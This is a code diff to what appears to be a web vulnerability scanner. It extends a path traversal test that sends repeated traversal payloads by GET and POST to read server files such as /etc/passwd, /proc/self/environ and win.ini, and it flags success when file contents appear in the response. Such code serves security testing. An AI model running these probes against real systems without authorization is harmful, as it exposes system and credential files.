@@ -35,8 +35,11 @@ def test_path_traversal(
         Dict with test results
     """
     result = {
+        "type": "path_traversal",
         "test": "path_traversal",
         "vulnerable": False,
+        "url": target_url,  # Include URL for detection matching
+        "param": param,  # Include parameter name
         "inclusion_type": None,
         "files_read": [],
         "evidence": None
@@ -72,64 +75,82 @@ def test_path_traversal(
     parsed = urlparse(target_url)
     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
     
-    # Test each file path with different traversal payloads
+    # Check for file content indicators
+    indicators = {
+        "/etc/passwd": ["root:", "bin/bash", "daemon:", "nobody:"],
+        "/etc/hosts": ["localhost", "127.0.0.1", "::1"],
+        "/proc/version": ["linux version", "gcc version", "ubuntu"],
+        "/proc/self/environ": ["path=", "home=", "user="],
+        "/windows/win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
+        "hosts": ["localhost", "127.0.0.1"],
+    }
+    
+    def check_response_for_indicators(resp, file_path):
+        """Check if response contains file content indicators."""
+        content = resp.text.lower()
+        
+        # Check for file-specific indicators
+        file_indicators = []
+        for key, inds in indicators.items():
+            if key in file_path.lower():
+                file_indicators = inds
+                break
+        
+        # Generic file content indicators
+        generic_indicators = ["root:", "localhost", "127.0.0.1", "bin/bash", "[fonts]"]
+        
+        # Check if any indicators are present
+        found_indicators = []
+        for ind in file_indicators + generic_indicators:
+            if ind in content:
+                found_indicators.append(ind)
+        
+        return found_indicators
+    
+    # Test each file path with different payloads and methods
     for file_path in file_paths:
+        # Build payloads: direct path first, then traversal variants
+        payloads = [file_path]  # Try direct path first (some apps accept this)
         for traversal in traversal_payloads:
-            # Build payload: traversal + file_path
-            payload = traversal * 5 + file_path  # Multiple traversals
-            
-            try:
-                resp = requests.get(
-                    base_url,
-                    params={param: payload},
-                    timeout=10
-                )
-                
-                content = resp.text.lower()
-                
-                # Check for file content indicators
-                indicators = {
-                    "/etc/passwd": ["root:", "bin/bash", "daemon:", "nobody:"],
-                    "/etc/hosts": ["localhost", "127.0.0.1", "::1"],
-                    "/proc/version": ["linux version", "gcc version", "ubuntu"],
-                    "/proc/self/environ": ["path=", "home=", "user="],
-                    "/windows/win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
-                    "hosts": ["localhost", "127.0.0.1"],
-                }
-                
-                # Check for file-specific indicators
-                file_indicators = []
-                for key, inds in indicators.items():
-                    if key in file_path.lower():
-                        file_indicators = inds
-                        break
-                
-                # Generic file content indicators
-                generic_indicators = ["root:", "localhost", "127.0.0.1", "bin/bash", "[fonts]"]
-                
-                # Check if any indicators are present
-                found_indicators = []
-                for ind in file_indicators + generic_indicators:
-                    if ind in content:
-                        found_indicators.append(ind)
-                
-                if found_indicators:
-                    result["vulnerable"] = True
-                    result["inclusion_type"] = "lfi"  # Local File Inclusion
-                    if file_path not in result["files_read"]:
-                        result["files_read"].append(file_path)
-                    result["evidence"] = {
-                        "payload": payload,
-                        "file_path": file_path,
-                        "indicators_found": found_indicators,
-                        "response_snippet": resp.text[:500],
-                        "status_code": resp.status_code,
-                        "note": "File content detected in response"
-                    }
-                    break
+            payloads.append(traversal * 5 + file_path)  # Multiple traversals
+        
+        for payload in payloads:
+            for method in ["GET", "POST"]:
+                try:
+                    if method == "GET":
+                        resp = requests.get(
+                            base_url,
+                            params={param: payload},
+                            timeout=10
+                        )
+                    else:
+                        # Try both form data and JSON for POST
+                        resp = requests.post(
+                            base_url,
+                            data={param: payload},
+                            timeout=10
+                        )
                     
-            except Exception:
-                continue
+                    found_indicators = check_response_for_indicators(resp, file_path)
+                    
+                    if found_indicators:
+                        result["vulnerable"] = True
+                        result["inclusion_type"] = "lfi"  # Local File Inclusion
+                        if file_path not in result["files_read"]:
+                            result["files_read"].append(file_path)
+                        result["evidence"] = {
+                            "payload": payload,
+                            "file_path": file_path,
+                            "method": method,
+                            "indicators_found": found_indicators,
+                            "response_snippet": resp.text[:500],
+                            "status_code": resp.status_code,
+                            "note": f"File content detected in {method} response"
+                        }
+                        return result  # Found vulnerability, return immediately
+                        
+                except Exception:
+                    continue
         
         if result["vulnerable"]:
             break
@@ -193,7 +214,10 @@ def test_path_traversal_params(
     # Discover parameters if not provided
     if not params:
         from tools.rest_api_fuzzer import discover_parameters
-        params = discover_parameters(target_url)
+        discovered_params = discover_parameters(target_url)
+        # Always include common path traversal parameter names
+        file_params = ["file", "path", "page", "include", "template", "view", "read", "doc", "document"]
+        params = list(set(discovered_params + file_params))
     
     # Test each parameter
     for param in params:
